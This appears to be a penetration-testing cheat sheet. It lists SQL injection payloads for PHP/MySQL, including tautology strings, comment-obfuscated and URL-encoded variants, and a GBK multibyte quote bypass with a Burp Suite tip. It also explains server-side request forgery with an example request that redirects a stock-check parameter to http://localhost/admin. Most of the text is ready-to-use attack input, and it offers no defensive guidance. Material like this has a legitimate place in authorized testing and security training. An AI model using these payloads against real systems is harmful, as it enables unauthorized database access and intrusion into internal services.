SQL Injection
-----------------------------
PHP & MYSQL
Note: The characters responsible for injection are either one of the following: ',",`
If one does not work please try the other characters. If none of them work try encoding them to unicode.

' || 1=1 #
'/**/||/**/1=1/**/#
'%27||%271=1%27#

%bf%27 or 1=1 -- (*1)
(*1 Note): Some databases may not have the same charset. You can change the browser 'attribute' option to gbk using burp suite. Ex: accept="gbk"

Server Side Request Forgery (SSRF)
-----------------------------
(Overview)
Server-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make HTTP requests to an arbitrary domain of the attacker's choosing.

In typical SSRF examples, the attacker might cause the server to make a connection back to itself, or to other web-based services within the organization's infrastructure, or to external third-party systems. 

(Example)
Consider a shopping application that lets the user view whether an item is in stock in a particular store. To provide the stock information, the application must query various back-end REST APIs, dependent on the product and store in question. The function is implemented by passing the URL to the relevant back-end API endpoint via a front-end HTTP request. So when a user views the stock status for an item, their browser makes a request like this:

POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1

This causes the server to make a request to the specified URL, retrieve the stock status, and return this to the user.

In this situation, an attacker can modify the request to specify a URL local to the server itself. For example:

POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://localhost/admin
